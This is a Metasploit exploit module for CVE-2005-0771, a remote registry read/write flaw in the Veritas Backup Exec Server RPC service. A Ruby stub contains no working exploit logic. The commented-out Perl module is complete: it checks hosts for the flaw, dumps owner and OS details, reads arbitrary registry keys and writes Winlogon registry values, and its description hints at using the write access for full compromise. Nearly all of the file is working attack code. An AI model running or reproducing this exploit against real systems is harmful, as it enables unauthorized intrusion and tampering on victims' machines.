require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Veritas Backup Exec Server Registry Access',
			'Description'    => %q{
				This modules exploits a remote registry access flaw in the
				BackupExec Windows Server RPC service. This vulnerability
				was discovered by Pedram Amini and is based on the NDR stub
				information information posted to openrce.org. The registry
				write capabilities can be used to compromise a vulnerable
				system, but this is left as an exercise to the user (hint:
				read the code for WinlogonWarning()).

				Please see the target list for the different attack modes.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '17627'],
					[ 'CVE', '2005-0771'],
					[ 'URL', 'http://www.idefense.com/application/poi/display?id=269&type=vulnerabilities'],
					[ 'MIL', '82'],

				],
			'Privileged'     => true,
			
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'any',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::backupexec_registry;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use Pex::DCERPC;
use Pex::BEServerRPC;

my $advanced = { };

my $info =
  {
	'Name'  	=> 'Veritas Backup Exec Server Registry Access',
	'Version'  	=> '$Revision$',
	'Authors' 	=> [ 'H D Moore <hdm [at] metasploit.com>' ],
	'Arch'  	=> [ ],
	'OS'    	=> [ ],

	'UserOpts'	=>
	  {
		'RHOST'  => [1, 'ADDR', 'The target address'],
		'RPORT'  => [1, 'PORT', 'The target port', 6106],
		'HIVE'   => [0, 'DATA', 'The hive name to read (HKLM, HKCU, etc)', 'HKLM'],
		'SUBKEY' => [0, 'DATA', 'The full path to the registry subkey', 'Hardware\Description\System\CentralProcessor\0' ],
		'SUBVAL' => [0, 'DATA', 'The name of the subkey value to read', 'ProcessorNameString'],
		'WARN'   => [0, 'DATA', 'The warning message to show at login'],
	  },


	'Description'  => Pex::Text::Freeform(qq{
		This modules exploits a remote registry access flaw in the BackupExec Windows
	Server RPC service. This vulnerability was discovered by Pedram Amini and is based
	on the NDR stub information information posted to openrce.org. The registry write 
	capabilities can be used to compromise a vulnerable system, but this is left as an
	exercise to the user (hint: read the code for WinlogonWarning()).
	
	Please see the target list for the different attack modes.
}),

	'Refs' =>
	  [
	  	[ 'OSVDB', '17627' ],
		[ 'CVE', '2005-0771' ],
		[ 'URL', 'http://www.idefense.com/application/poi/display?id=269&type=vulnerabilities'],
		['MIL', '82'],		
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
			['Display System Information',                     'INFO'  ],
			['Read Arbitrary Registry Path',                   'READ'  ],
			['Write a Warning Message for Winlogon',           'WRITE' ],
	  ],

	'Keys' => ['veritas'],
  };


sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');	
	
	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return $self->CheckCode('Connect');
	}	
	
	my ($bind, $ctx) = Pex::DCERPC::BindFakeMulti (
		Pex::DCERPC::UUID_to_Bin('93841fd0-16ce-11ce-850d-02608c44967b'),
		'1.0',
	);
	
	$s->Send($bind);
	
	my $rpc = Pex::DCERPC::ReadResponse($s);
	if (! $rpc) {
		$s->Close;
		$self->PrintLine('[*] Unknown response received from the server');
		return $self->CheckCode('Unknown');
	}
	
	# Generate the RPC request packets
	my @pkts = Pex::DCERPC::Request (
		7, 
		Pex::BEServerRPC::RegEnum(''),
		256,
		$ctx
	);
	
	# Send each fragment of the request
	foreach (@pkts) { $s->Send($_) }
	
	# Read the response packet
	$rpc = Pex::DCERPC::ReadResponse($s);
	$s->Close;
	
	# Remove the NULLs to make matching easier
	my $raw = $rpc->{'StubData'};
	$raw =~ s/\x00//g;
	
	# Look for the HKLM\Software and HKLM\Hardware keys
	if ($raw =~ /SOFTWARE/i && $raw =~/HARDWARE/i) {
		$self->PrintLine("[*] This system appears to be vulnerable");
		return $self->CheckCode('Confirmed');
	}

	$self->PrintLine("[*] This system does not appear to be vulnerable");
	return $self->CheckCode('Safe');
}

sub HiveMap {
	my $self = shift;
	my $hive = shift;
	my %hmap =
	(
		'HKCR' => 0x80000000,
		'HKCU' => 0x80000001,
		'HKLM' => 0x80000002,
		'HKU'  => 0x80000003,
		'HKPD' => 0x80000004,
		'HKCC' => 0x80000005,
		'HKDD' => 0x80000006,
	);
	
	return $hmap{$hive} if exists($hmap{$hive});

	$self->PrintLine("[*] Invalid hive name. Options: ".join(", ", keys %hmap));
	return;
}


sub Exploit {
	my $self        = shift;
	my $target_idx  = $self->GetVar('TARGET');
	my $target      = $self->Targets->[$target_idx];

	if ($target->[1] eq 'INFO') {
		return $self->DumpInfo();
	}
	
	if ($target->[1] eq 'READ') {
		return $self->ReadRegistry();
	}
	
	if ($target->[1] eq 'WRITE') {
		return $self->WinlogonWarning();
	}
}

sub DumpInfo {
	my $self = shift;

	my $prod = $self->RegReadString(
		$self->HiveMap('HKLM'),
		'Software\Microsoft\Windows\CurrentVersion',
		'ProductId'
	) || return;
		
	my $user = $self->RegReadString(
		$self->HiveMap('HKCU'),
		'Software\Microsoft\Windows\CurrentVersion\Explorer',
		'Logon User Name'
	) || "SYSTEM";
	$self->PrintLine("[*] The current interactive user is $user");


	my $os_name = $self->RegReadString(
		$self->HiveMap('HKLM'),
		'Software\Microsoft\Windows NT\CurrentVersion',
		'ProductName'
	) || "Windows (Unknown)";
	
	my $os_sp = $self->RegReadString(
		$self->HiveMap('HKLM'),
		'Software\Microsoft\Windows NT\CurrentVersion',
		'CSDVersion'
	) || "No Service Pack";	
	$self->PrintLine("[*] This system is running $os_name $os_sp");	

	my $owned_name = $self->RegReadString(
		$self->HiveMap('HKLM'),
		'Software\Microsoft\Windows NT\CurrentVersion',
		'RegisteredOwner'
	) || "Unknown Owner";	
	
	my $owned_corp = $self->RegReadString(
		$self->HiveMap('HKLM'),
		'Software\Microsoft\Windows NT\CurrentVersion',
		'RegisteredOrganization'
	) || "Unknown Organization";
	$self->PrintLine("[*] Registered to $owned_name of $owned_corp");		

	my $cpu0 = $self->RegReadString(
		$self->HiveMap('HKLM'),
		'Hardware\Description\System\CentralProcessor\0',
		'ProcessorNameString'
	) || "Unknown CPU";
	$self->PrintLine("[*] Using a CPU of type $cpu0");		
				
	return;
}

sub ReadRegistry {
	my $self = shift;
	my $skey = $self->GetVar('SUBKEY');
	my $sval = $self->GetVar('SUBVAL');
	my $hive = $self->HiveMap($self->GetVar('HIVE'));
	return if ! $hive;
	
	my $data = $self->RegReadString($hive, $skey, $sval);
	return if ! $data;
	
	$self->PrintLine("[*] $skey:$sval = '$data'");
	return;
}

sub WinlogonWarning {
	my $self = shift;
	my $hive = $self->HiveMap('HKLM');
	
	# REG_DWORD = 4
	# REG_SZ    = 1
	
	my $keyname = 'Software\Microsoft\Windows NT\CurrentVersion\Winlogon';
	my $warning = $self->GetVar('WARN') || 
		"This system is running a vulnerable version of BackupExec! Patch it now!\r\n";
	
	if (! $self->RegWriteString( $hive, $keyname, 'LegalNoticeText', $warning, 1) ) {
		$self->PrintLine('[*] Failed to write the legal notice registry entry');
		return;
	}

	if (! $self->RegWriteString( $hive, $keyname, 'LegalNoticeCaption', 'METASPLOIT', 1) ) {
		$self->PrintLine('[*] Failed to write the legal notice caption registry entry');
		return;
	}	
	
	$self->PrintLine("[*] The warning message will be displayed at the new login");
}	


sub RegReadString {
	my $self = shift;
	my $hive = shift;
	my $path = shift;
	my $sval = shift;

	my ($s, $ctx) = $self->ConnectAndBind();
	return if ! $s || ! $ctx;
	
	# Generate the RPC request packets
	my @pkts = Pex::DCERPC::Request (
		4, 
		Pex::BEServerRPC::RegRead(
			'SubKey' => $path,
			'SubVal' => $sval,
			'Hive'   => $hive,
		),
		256,
		$ctx
	);
	
	# Send each fragment of the request
	foreach (@pkts) { $s->Send($_) }
	
	# Read the response packet
	my $rpc = Pex::DCERPC::ReadResponse($s);
	$s->Close;
	
	my ($ret, $len) = unpack('V*', $rpc->{'StubData'});
	if ($ret != 1 && $ret != 3) {
		return;
	}
	
	my $raw = substr($rpc->{'StubData'}, 8, $len);
	return $raw;
}

sub RegWriteString {
	my $self = shift;
	my $hive = shift;
	my $path = shift;
	my $skey = shift;
	my $sval = shift;
	my $type = shift;

	my ($s, $ctx) = $self->ConnectAndBind();
	return if ! $s || ! $ctx;

	# Generate the RPC request packets
	my @pkts = Pex::DCERPC::Request (
		5, 
		Pex::BEServerRPC::RegWrite(
			'SubKey' => $path,
			'SubVal' => $skey,
			'Hive'   => $hive,
			'Data'   => $sval,
			'Type'   => $type,
		),
		256,
		$ctx
	);
	
	# Send each fragment of the request
	foreach (@pkts) { $s->Send($_) }
	
	# Read the response packet
	my $rpc = Pex::DCERPC::ReadResponse($s);
	$s->Close;
	if (! $rpc->{'StubData'}) {
		return;
	}
	
	# print "response: ".unpack("H*", $rpc->{'StubData'})."\n";
	return 1;
}

sub ConnectAndBind {
	my $self = shift;
	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $self->GetVar('RHOST'),
		'PeerPort'  => $self->GetVar('RPORT'),
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return;
	}

	my ($bind, $ctx) = Pex::DCERPC::BindFakeMulti (
		Pex::DCERPC::UUID_to_Bin('93841fd0-16ce-11ce-850d-02608c44967b'),
		'1.0',
	);
	
	$s->Send($bind);
	
	my $rpc = Pex::DCERPC::ReadResponse($s);
	if (! $rpc) {
		$s->Close;
		$self->PrintLine('[*] Unknown response received from the server');
		return;
	}
	
	return ($s, $ctx);
}

1;

=end


end
end	
